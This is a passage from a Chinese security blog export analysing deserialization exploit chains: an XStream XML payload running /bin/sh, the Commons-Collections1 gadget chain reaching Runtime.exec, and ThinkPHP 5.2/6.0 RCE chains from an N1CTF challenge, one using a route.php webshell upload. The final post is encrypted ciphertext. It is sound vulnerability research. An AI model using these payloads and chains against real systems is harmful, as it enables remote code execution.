这里的yamlStr可以用https://github.com/mbechler/marshalsec生成危害更大的payload c. XStream.fromXML参考链接 添加XStream库 12345&lt;dependency&gt; &lt;groupId&gt;com.thoughtworks.xstream&lt;/groupId&gt; &lt;artifactId&gt;xstream&lt;/artifactId&gt; &lt;version&gt;1.4.10&lt;/version&gt;&lt;/dependency&gt; 123456789101112131415161718192021public static void main(String[] args) &#123;// expGen(); String payload = \"&lt;sorted-set&gt;\\n\" + \" &lt;string&gt;foo&lt;/string&gt;\\n\" + \" &lt;dynamic-proxy&gt;\\n\" + \" &lt;interface&gt;java.lang.Comparable&lt;/interface&gt;\\n\" + \" &lt;handler class=\\\"java.beans.EventHandler\\\"&gt;\\n\" + \" &lt;target class=\\\"java.lang.ProcessBuilder\\\"&gt;\\n\" + \" &lt;command&gt;\\n\" + \" &lt;string&gt;/bin/sh&lt;/string&gt;\\n\" + \" &lt;string&gt;-c&lt;/string&gt;\\n\" + \" &lt;string&gt;open /System/Applications/Calculator.app&lt;/string&gt;\\n\" + \" &lt;/command&gt;\\n\" + \" &lt;/target&gt;\\n\" + \" &lt;action&gt;start&lt;/action&gt;\"+ \" &lt;/handler&gt;\\n\" + \" &lt;/dynamic-proxy&gt;\\n\" + \"&lt;/sorted-set&gt;\\n\"; XStream xStream = new XStream(); xStream.fromXML(payload); &#125; d. 上面的6和7，留到后面分析4. 小结上面两节介绍了Java反序列化的原理，并扩展了反序列化的触发点。在实际的审计过程中，可以直接关注这些函数的调用 1(readObject|readUnshared|load|fromXML|readValue|parseObject)\\s*\\( 当然有些还需要看是否是有漏洞的版本 0x02 反序列化过程上面大致讲诉了序列化和反序列化的使用方法，本节将调试上面的Employee案例，来看看在代码层面反序列化过程是怎么样的！ 这里使用的是ObjectInputStream的反序列化方法readObject函数 其实整一个反序列化过程总体来说分为两步，从字符串流中根据序列化规格提取出可能的类，然后将该类使用反射机制查找或创建一个实例。其中也会有一些检查的过程，这里例子比较简单，不叙述。 来看一下查找或创建的过程 ObjectInputStream:readObject:417 跟进ObjectInputStream的readObject类，该函数体现了整个反序列化的过程，其中其主要功能的是readObject0函数 ObjectInputStream:readObject0:1515 从流中读取出当前的类型，tc=115此时代表Object对象，从而进入readOrdinaryObject ObjectInputStream:readOrdinaryObject:2026 该函数主要做了实例化对象的工作，其中2033行生成的ObjectStreamClass对象，会利用反射机制实例化序列化流中的对象。2044行实际的获取到该对象。 关于ObjectStreamClass的功能，它是类的序列化描述器，包含类的名字和序列版本号。使用它的lookup函数可以载入或新建该类，但这里实际上用的是newInstance来实例化当前的序列化描述器，即产生当前描述器指代的类。 Serialization’s descriptor for classes. It contains the name and serialVersionUID of the class. The ObjectStreamClass for a specific class loaded in this Java VM can be found/created using the lookup method. 其中函数readClassDesc将从序列化流中提取出相关的类信息。这里就直接看利用反射机制获取到类的地方，位于ObjectInputStream.resolveClass，下图为调用链 ObjectInputStream:resolveClass:677 这里提取了jvm中当前这个流中的类的Class对象，用于后续的newInstance。 此处整一个反射就是先通过Class.forName获取到当前描述器所指代的类的Class对象，后续会在initNonProxy或initProxy函数中复制该Class对象的相关信息(包括相关函数)，最后在2044行处ObjectStreamClass.newInstance实例化该对象。 在实例化后会用ObjectInputStream.readSerialData函数将序列化流中的相关数据填充进实例化后的对象中或调用当前类描述器的readObject函数。 ObjectInputStream:readSerialData:2149 这里会根据当前的类描述器是否存在readObject函数来自动调用该函数，或者是填充序列流中的field数据。这里的readObject的调用常为利用链的一部分，例如CommonsCollections1中的AnnotationInvocationHandler，后文将分析该函数。 注意：由于我们用的是Serializable接口，所以上述并未提及使用Externalizable接口的情况。 到此为止，最后返回的对象就是最终我们得到的序列化前的对象。 小结这里引用浅谈Java反序列化漏洞修复方案 Java程序中类ObjectInputStream的readObject方法被用来将数据流反序列化为对象，如果流中的对象是class，则它的ObjectStreamClass描述符会被读取，并返回相应的class对象，ObjectStreamClass包含了类的名称及serialVersionUID。 如果类描述符是动态代理类，则调用resolveProxyClass方法来获取本地类。如果不是动态代理类则调用resolveClass方法来获取本地类。如果无法解析该类，则抛出ClassNotFoundException异常。 如果反序列化对象不是String、array、enum类型，ObjectStreamClass包含的类会在本地被检索，如果这个本地类没有实现java.io.Serializable或者externalizable接口，则抛出InvalidClassException异常。因为只有实现了Serializable和Externalizable接口的类的对象才能被序列化。 前面分析中提到最后会调用resolveClass获取类的Class对象，这是反序列化过程中一个重要的地方，也是必经之路，所以有研究人员提出通过重载ObjectInputStream的resolveClass来限制可以被反序列化的类 0x03 利用链发掘同PHP的反序列化一样，单单发现反序列化的触发点并不能造成严重的影响。往往反序列化漏洞的危害程度取决于后续的反序列化利用链所能达到的危险程度。在java中ysoserial工具给我们提供了许多常见的库存在的利用链，这一节将逐一分析这些利用链。 1. CommonsCollections1(jdk&lt;=7)参考链接 Apache Commons Collections是一个扩展了Java标准库里的Collection结构的第三方基础库，它提供了很多强有力的数据结构类型并且实现了各种集合工具类。作为Apache开源项目的重要组件，Commons Collections被广泛应用于各种Java应用的开发。 CommonsCollection1的分析文章比较多，刚开始先从这个gadget开始分析。这里我用的分析方法是先写一个触发点，然后用ysoserial生成payload来调试。 CommonsCollections1 payload针对的commons-collections 3.1版本，先引入库 123456&lt;!-- https://mvnrepository.com/artifact/commons-collections/commons-collections --&gt;&lt;dependency&gt; &lt;groupId&gt;commons-collections&lt;/groupId&gt; &lt;artifactId&gt;commons-collections&lt;/artifactId&gt; &lt;version&gt;3.1&lt;/version&gt;&lt;/dependency&gt; 在ysoserial的exp中，我们可以看到一整个调用的链 我们可以看到利用链的最后调用了Runtime.getRuntime().exec()，这意味着我们需要在前一步的链上可以达到调用任意类和方法的函数。 CommonsCollections1用的就是3.1版本下的InvokerTransformer.transform() 1234567891011121314151617public Object transform(Object input) &#123; if (input == null) &#123; return null; &#125; try &#123; Class cls = input.getClass(); Method method = cls.getMethod(iMethodName, iParamTypes); return method.invoke(input, iArgs); &#125; catch (NoSuchMethodException ex) &#123; throw new FunctorException(\"InvokerTransformer: The method '\" + iMethodName + \"' on '\" + input.getClass() + \"' does not exist\"); &#125; catch (IllegalAccessException ex) &#123; throw new FunctorException(\"InvokerTransformer: The method '\" + iMethodName + \"' on '\" + input.getClass() + \"' cannot be accessed\"); &#125; catch (InvocationTargetException ex) &#123; throw new FunctorException(\"InvokerTransformer: The method '\" + iMethodName + \"' on '\" + input.getClass() + \"' threw an exception\", ex); &#125;&#125; 此处用的就是Java的反射机制，动态调用类和方法。为了能动态调用任意类函数，我们还得控制iMethodName、iParamTypes、iArgs，该类属性定义在InvokerTransformer的构造函数上 123456public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) &#123; super(); iMethodName = methodName; iParamTypes = paramTypes; iArgs = args;&#125; 那么接下来就跟php类似了，找一个类，它的类属性可控，且该类属性后续还会调用transform函数。由于完成Runtime.getRuntime().exec()动作需要多次调用transform函数（先调用Runtime.getRuntime再调用Runtime.exec），所以还得找一个能多次调用transform的地方，来看一下ChainedTransformer 12345678private final Transformer[] iTransformers;// 填充构造后的实例public Object transform(Object object) &#123; for (int i = 0; i &lt; iTransformers.length; i++) &#123; object = iTransformers[i].transform(object);// 调用链， &#125; return object;&#125; 在Transformer的子类下面找到能生成命令执行的利用链即可，来分析一下CommonCollections1的构造 123456789101112// real chain for after setupfinal Transformer[] transformers = new Transformer[] &#123; new ConstantTransformer(Runtime.class),// 获取Runtime对象 new InvokerTransformer(\"getMethod\", new Class[] &#123;//获取Runtime.getRuntime()方法对象 String.class, Class[].class &#125;, new Object[] &#123; \"getRuntime\", new Class[0] &#125;), new InvokerTransformer(\"invoke\", new Class[] &#123;// 反射调用invoke,再invoke执行Runtime.getRuntime()方法，获取Runtime实例化对象 Object.class, Object[].class &#125;, new Object[] &#123; null, new Object[0] &#125;), new InvokerTransformer(\"exec\",// 反射调用exec方法，执行最终的命令 new Class[] &#123; String.class &#125;, execArgs), new ConstantTransformer(1) &#125;; 链的第一个结点选用的是ConstantTransformer，其transformer直接返回构造时的对象 123456789private final Object iConstant;// 此时iConstant置为Runtime.classpublic ConstantTransformer(Object constantToReturn) &#123; super(); iConstant = constantToReturn;&#125;public Object transform(Object input) &#123;// 直接返回Runtime.class return iConstant;&#125; 最终的调用，类似 1234567891011Object obj = Runtime.class;Class cls = obj.getClass();Method method;method = cls.getMethod(\"getMethod\",new Class[] &#123;String.class, Class[].class &#125;);obj = method.invoke(obj, new Object[] &#123;\"getRuntime\", new Class[0] &#125;);cls = obj.getClass();method = cls.getMethod(\"invoke\",new Class[] &#123;Object.class, Object[].class &#125;);obj = method.invoke(obj, new Object[] &#123;null, new Object[0] &#125;);cls = obj.getClass();method = cls.getMethod(\"exec\",new Class[] &#123; String.class &#125;);method.invoke(obj, new String[] &#123; \"open /System/Applications/Calculator.app\" &#125;); 接下来的问题是如何触发ChainedTransformer？搜索一下调用transform的位置，排除掉xxxTransformer类，最有可能被利用的就是LazyMap.get、TransformedMap.checkSetValue，其中checkSetValue会在setValue函数被调用的时候调用。 接下来就是找能触发上面两个利用方式的方法。 同样的，前面基础知识提到，如果一个对象的readObject函数被重载了，会优先调用重载后的readObject函数。 我们最好能在被重载的readObject函数中发现相关可控Map数据的操作(get和setValue)。 而exp中sun.reflect.annotation.AnnotationInvocationHandler非常符合上述的描述。 来看一下这个类的readObject实现 123456789101112131415161718192021222324252627282930313233private void readObject(java.io.ObjectInputStream s) throws java.io.IOException, ClassNotFoundException &#123; s.defaultReadObject(); // Check to make sure that types have not evolved incompatibly AnnotationType annotationType = null; try &#123; annotationType = AnnotationType.getInstance(type); &#125; catch(IllegalArgumentException e) &#123; // Class is no longer an annotation type; time to punch out throw new java.io.InvalidObjectException(\"Non-annotation type in annotation serial stream\"); &#125; Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes(); // If there are annotation members without values, that // situation is handled by the invoke method. for (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123; String name = memberValue.getKey(); Class&lt;?&gt; memberType = memberTypes.get(name); if (memberType != null) &#123; // i.e. member still exists Object value = memberValue.getValue(); if (!(memberType.isInstance(value) || value instanceof ExceptionProxy)) &#123; memberValue.setValue( new AnnotationTypeMismatchExceptionProxy( value.getClass() + \"[\" + value + \"]\").setMember( annotationType.members().get(name))); &#125; &#125; &#125;&#125; 在第26行处，调用了memberValue.setValue，这里的memberValue我们可以将其置为构造好的TransformedMap实例。 在这个TransformedMap实例上，valueTransformer属性被置为前文的ChainedTransformer。这样这个链就串起来了，总结一下 1234sun.reflect.annotation.AnnotationInvocationHandler.readObject() -&gt; memberValue.setValue() =&gt; TransformedMap.setValue() =&gt; TransformedMap.checkSetValue() -&gt; valueTransformer.transform() =&gt; ChainedTransformer.transform() -&gt; 前文构造的Runtime.getRuntime().exec() 第二种，利用LazyMap.get() CommonsCollections1中利用了AnnotationInvocationHandler.invoke函数 123456789101112131415161718public Object invoke(Object proxy, Method method, Object[] args) &#123; String member = method.getName(); // ... switch(member) &#123; case \"toString\": return toStringImpl(); case \"hashCode\": return hashCodeImpl(); case \"annotationType\": return type; &#125; // Handle annotation member accessors Object result = memberValues.get(member); // ...&#125; 第15行调用了memberValues.get函数，这里如果memberValues设置为构造好的LazyMap实例，将触发该利用链的执行。 那么怎么来调用invoke函数呢？这里用到了Proxy动态代理机制。在该机制下被代理的实例不管调用什么类方法，都会先调用invoke函数。 那么我们利用Proxy动态代理AnnotationInvocationHandler，并将memberValues设置为LazyMap。在AnnotationInvocationHandler.readObject函数里，第19行调用了memberValues.entrySet函数。在动态代理下会先调用invoke函数，且此时的函数名entrySet不在toString、hashCode、annotationType里，那么会最终走到第15行的位置。总结一下这个调用链 123456sun.reflect.annotation.AnnotationInvocationHandler.readObject() -&gt; memberValues.entrySet() -&gt; AnnotationInvocationHandler.invoke() -&gt; memberValues.get() =&gt; LazyMap.get() -&gt; factory.transform() =&gt; ChainedTransformer.transform() -&gt; 前文构造的Runtime.getRuntime().exec() 这也是ysoserial的CommonsCollections1的调用链。 后续的利用链分析放在下一篇文章里。 0x04 总结经过对ysoserial工具生成的反序列化利用链的调试，熟悉了Java的反序列化的一个流程。但对于exp的书写仍然有待提高。 需要注意的是，CommonCollections1和3用的override.class作为Annotation在jdk8上是不适用的，要调试这两个payload需要用jdk7，参考 除此之外，在调试过程中，体会到了javassist库的强大，修改jar包里的class文件非常舒服！ Proxy的动态代理机制，Java的反射机制相信会是后续学习的一个重点，继续💪！"},{"title":"【Code Review】thinkphp v5.2.x 反序列化利用链挖掘","permalink":"http://blog.0kami.cn/2019/09/10/php-thinkphp-5-2-x-反序列化利用链/","text":"0x00 前言上周参与了N1CTF，里面有一道关于thinkphp5的反序列化漏洞的利用。记录一下关于该反序列化的利用链分析。 后文主要包括两条链的利用分析（一条是我找的，也是题目的预期解，另一条是wonderkun师傅找的非预期解） 0x01 环境准备这里就不直接用题目的环境了，采用composer直接安装5.2.*-dev版本 1composer create-project topthink/think=5.2.x-dev v5.2 0x02 利用链分析背景回顾tp5在我印象里反序列化的利用链存在一个Windows类的任意文件删除，但是在这篇文章)的启示下，也算是找到了一条新的路（关于__toString的触发方式，除了字符串拼接的方式，还可以利用PHP自带函数参数的强制转换）。 这篇文章的利用链最后用到了5.1.37版本think/Request.php的 __call函数，该函数的调用函数名可控，所以可以导致任意调用其他的类函数。而在5.2.x版本不存在这样的一个__call函数，这意味着我们需要重新找一个最终达成命令执行的函数调用（__call函数前的利用链仍然可用）。 那么接下来，我们来看看5.2.x新的利用链吧：） think/model/concern/Attribute.php getValue可函数动态调用函数（题目的预期解）由于5.1.37__call函数前的利用链仍然存在于5.2.x版本，这里就不再详述了。 先来看一下Conversion类的toArray函数 123456789101112131415public function toArray(): array&#123; // ... // 合并关联数据 $data = array_merge($this-&gt;data, $this-&gt;relation); foreach ($data as $key =&gt; $val) &#123; if ($val instanceof Model || $val instanceof ModelCollection) &#123; // ... &#125; elseif (isset($this-&gt;visible[$key])) &#123; $item[$key] = $this-&gt;getAttr($key);// relation和visible存在同一个key就行 // ... &#125; // ... 去掉了无关的代码，这里$this-&gt;visible、$this-&gt;relation均可控，可伪造数据进入getAttr函数 12345678910111213141516public function getAttr(string $name)&#123; // ... return $this-&gt;getValue($name, $value, $relation);&#125;protected function getValue(string $name, $value, bool $relation = false)&#123; // 检测属性获取器 $fieldName = $this-&gt;getRealFieldName($name);// 直接返回$name的值 // ... if (isset($this-&gt;withAttr[$fieldName])) &#123; // ... $closure = $this-&gt;withAttr[$fieldName]; // withAttr内容可控 $value = $closure($value, $this-&gt;data); // 动态调用函数 // ... 直接关注getValue函数，该函数可动态调用函数，并且调用函数、函数参数均可控。所以接下来有两种方法，第一种是找一个符合条件的php函数，另一种是利用tp自带的SerializableClosure调用，来看一下第二种。 \\Opis\\Closure可用于序列化匿名函数，使得匿名函数同样可以进行序列化操作。这意味着我们可以序列化一个匿名函数，然后交由上述的$closure($value, $this-&gt;data)调用执行。 123$func = function()&#123;phpinfo();&#125;;$closure = new \\Opis\\Closure\\SerializableClosure($func);$closure($value, $this-&gt;data);// 这里的参数可以不用管 以上述代码为例，将调用phpinfo函数。 到此为止，我们分析完了整一个调用流程，回顾一下 vendor/topthink/framework/src/think/process/pipes/Windows.php __destruct -&gt;removeFiles -&gt;file_exists 强制转化字符串filename，这里的filename可控 可触发__toString函数，下一步找可利用的__toString vendor/topthink/framework/src/think/model/concern/Conversion.php __toString -&gt; toJson -&gt; toArray创造符合条件的relation和visible-&gt; getAttr 下一步调用vendor/topthink/framework/src/think/model/concern/Attribute.php的getValue函数 vendor/topthink/framework/src/think/model/concern/Attribute.phpgetValue -&gt; $closure动态调用函数，且该内容可控下一步利用有两种，一种找符合的php函数，另一种利用tp自带的SerializableClosure调用 vendor/opis/closure/src/SerializableClosure.php构造可利用的匿名函数 我把exp集成到了phpggc上，使用如下命令即可生成 1./phpggc -u ThinkPHP/RCE1 'phpinfo();' 这里由于用到了SerializableClosure，需要使用编码器编码，不可直接输出拷贝利用。 think/Db.php __call函数可实例化任意类（题目的非预期解）前面说到5.1.37版本的利用链的__call函数，在5.2.x版本没办法用了。但是从__destruct到__call的链路是通的，我们只需要重新找一个可用的__call函数即可。 来看一下vendor/topthink/framework/src/think/Db.php的__call函数 12345678public function __call($method, $args)&#123; $class = $this-&gt;config['query']; $query = new $class($this-&gt;connection); return call_user_func_array([$query, $method], $args);&#125; $this-&gt;config和$this-&gt;connection均可控，这意味着我们可以实例化任意符合条件的类，这里找了think\\Url 12345678910public function __construct(App $app, array $config = [])&#123; $this-&gt;app = $app; $this-&gt;config = $config; if (is_file($app-&gt;getRuntimePath() . 'route.php')) &#123; // 读取路由映射文件 $app-&gt;route-&gt;import(include $app-&gt;getRuntimePath() . 'route.php'); &#125;&#125; 该构造器引入了RuntimePath下的route.php文件，因为这道题是允许上传文件的，所以只要在可上传的目录下上传一个route.php的webshell即可。至于RuntimePath，$app为可控变量，直接修改$runtimePath的内容即可。 我们直接构造App对象为 123456789class App&#123; protected $runtimePath; public function __construct(string $rootPath = '')&#123; $this-&gt;rootPath = $rootPath; $this-&gt;runtimePath = \"/tmp/\"; $this-&gt;route = new \\think\\route\\RuleName(); &#125;&#125; 这个构造思路太溜了，膜一波：） 整理一下过程 vendor/topthink/framework/src/think/process/pipes/Windows.php__destruct -&gt;removeFiles -&gt;file_exists 强制转化字符串filename，这里的filename可控可触发__toString函数，下一步找可利用的__toString vendor/topthink/framework/src/think/model/concern/Conversion.php__toString -&gt; toJson -&gt; toArray-&gt;appendAttrToArray-&gt;$relation调用不存在的函数，触发__call vendor/topthink/framework/src/think/Db.php__call -&gt; new $class($this-&gt;connection) 调用任意类的__construct函数 vendor/topthink/framework/src/think/Url.php构造App类，达到include任意文件的效果"},{"title":"【Code Review】thinkphp v6.0.x 反序列化利用链挖掘","permalink":"http://blog.0kami.cn/2019/09/10/php-thinkphp-6-0-x-反序列化利用链/","text":"0x00 前言上一篇分析了tp 5.2.x的反序列化利用链挖掘，顺着思路，把tp6.0.x也挖了。有类似的地方，也有需要重新挖掘的地方。 0x01 环境准备采用composer安装6.0.*-dev版本 1composer create-project topthink/think=6.0.x-dev v6.0 0x02 利用链分析背景回顾拿到v6.0.x版本，简单的看了一下，有一个好消息和一个坏消息。 好消息是5.2.x版本函数动态调用的反序列化链后半部分，还可以利用。 坏消息是前面5.1.x，5.2.x版本都基于触发点Windows类的__destruct,好巧不巧的是6.0.x版本取消了Windows类。这意味着我们得重新找一个合适的起始触发点，才能继续使用上面的好消息。 vendor/topthink/think-orm/src/Model.php 新起始触发点为了节省篇幅，后文不再重复介绍触发__toString函数后的利用链，这部分同5.2.x版本相同(不过wonderkun师傅的利用链已失效，动态函数调用的利用链还能用)。 通常最好的反序列化起始点为__destruct、__wakeup，因为这两个函数的调用在反序列化过程中都会自动调用，所以我们先来找此类函数。这里我找了vendor/topthink/think-orm/src/Model.php的__destruct函数。 1234567891011121314151617public function __destruct()&#123; if ($this-&gt;lazySave) &#123;// 构造lazySave为true，进入save函数 $this-&gt;save(); &#125;&#125;public function save(array $data = [], string $sequence = null): bool&#123; // ... if ($this-&gt;isEmpty() || false === $this-&gt;trigger('BeforeWrite')) &#123; return false; &#125; $result = $this-&gt;exists ? $this-&gt;updateData() : $this-&gt;insertData($sequence); // ...&#125; 首先构造lazySave的值为true,从而进入save函数。 这次触发点位于updateData函数内，为了防止前面的条件符合，而直接return，我们首先需要构造相关参数 1234567891011public function isEmpty(): bool&#123; return empty($this-&gt;data);&#125;protected function trigger(string $event): bool&#123; if (!$this-&gt;withEvent) &#123; return true; &#125; // ... 其中需保证isEmpty返回false，以及$this-&gt;trigger(&#39;BeforeWrite&#39;)返回true 构造$this-&gt;data为非空数组 构造$this-&gt;withEvent为false 构造$this-&gt;exists为true 从而进入我们需要的updateData函数，来看一下该函数内容 12345678910111213141516171819202122protected function updateData(): bool&#123; // 事件回调 if (false === $this-&gt;trigger('BeforeUpdate')) &#123;// 此处前面已符合条件 return false; &#125; // ... // 获取有更新的数据 $data = $this-&gt;getChangedData(); if (empty($data)) &#123; // 关联更新 if (!empty($this-&gt;relationWrite)) &#123; $this-&gt;autoRelationUpdate(); &#125; return true; &#125; // ... // 检查允许字段 $allowFields = $this-&gt;checkAllowFields(); // 触发__toString 同样的，为了防止提前return，需要符合$data非空，来看一下getChangedData 1234567891011121314public function getChangedData(): array&#123; $data = $this-&gt;force ? $this-&gt;data : array_udiff_assoc($this-&gt;data, $this-&gt;origin, function ($a, $b) &#123; if ((empty($a) || empty($b)) &amp;&amp; $a !== $b) &#123; return 1; &#125; return is_object($a) || $a != $b ? 1 : 0; &#125;); // ... return $data;&#125; 这里我们可以强行置$this-&gt;force为true，直接返回我们前面构造的非空$this-&gt;data 这样，我们就成功到了调用checkAllowFields的位置 1234567891011121314151617protected function checkAllowFields(): array&#123; // 检测字段 if (empty($this-&gt;field)) &#123; if (!empty($this-&gt;schema)) &#123; $this-&gt;field = array_keys(array_merge($this-&gt;schema, $this-&gt;jsonType)); &#125; else &#123; $query = $this-&gt;db();// 最终的触发__toString的函数 $table = $this-&gt;table ? $this-&gt;table . $this-&gt;suffix : $query-&gt;getTable(); $this-&gt;field = $query-&gt;getConnection()-&gt;getTableFields($table); &#125; return $this-&gt;field; &#125; // ...&#125; 同样，为了到$this-&gt;db()函数的调用，需要 构造$this-&gt;field为空 构造$this-&gt;schema为空 其实这两个地方不需要构造，默认都为空 最终，我们终于到了可以触发__toString的位置 123456public function db($scope = []): Query&#123; /** @var Query $query */ $query = self::$db-&gt;connect($this-&gt;connection) -&gt;name($this-&gt;name . $this-&gt;suffix)// toString -&gt;pk($this-&gt;pk); 看到熟悉的字符串拼接了嘛！！！ 不过为了达到该出拼接，我们还是得首先满足connect函数的调用。此处代码就不说了，置$this-&gt;connection为mysql即可。接下来，不管是设$this-&gt;name还是$this-&gt;suffix为最终的触发__toString的对象，都会有同样的效果。 后续的思路，就是原来vendor/topthink/think-orm/src/model/concern/Conversion.php的__toString开始的利用链，不在叙述。 我把exp集成到了phpggc上，使用如下命令即可生成 1./phpggc -u ThinkPHP/RCE2 'phpinfo();' 这里由于用到了SerializableClosure，需要使用编码器编码，不可直接输出拷贝利用。"},{"title":"【Code Review】mycncart sqli","permalink":"http://blog.0kami.cn/2019/02/25/php/mycncart-v2-0-0-3-sqli/","text":"welcome to my blog, enter password to read. Incorrect Password! No content to display! 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